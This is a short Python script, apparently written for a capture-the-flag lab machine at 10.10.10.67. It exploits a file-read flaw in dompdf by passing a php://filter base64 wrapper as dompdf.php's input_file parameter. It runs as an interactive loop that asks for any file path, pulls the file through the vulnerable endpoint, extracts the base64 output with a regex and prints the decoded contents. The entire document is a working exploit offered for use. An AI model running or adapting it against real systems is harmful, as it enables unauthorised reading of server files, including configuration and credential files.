import requests
from base64 import b64decode
import re
import readline

def GetFile(file):
    url = (f"http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource={file}")
    response = requests.get(url)
    r = response.text
    regex = r'\[\((.*?)\)\]'
    matches = re.findall(regex, r)

    for match in matches:
        print(b64decode(match).decode('utf-8'))

while True:
    try:
        file = input("The file: ")
        GetFile(file)
    except KeyboardInterrupt:
        print("    Exiting")
        break
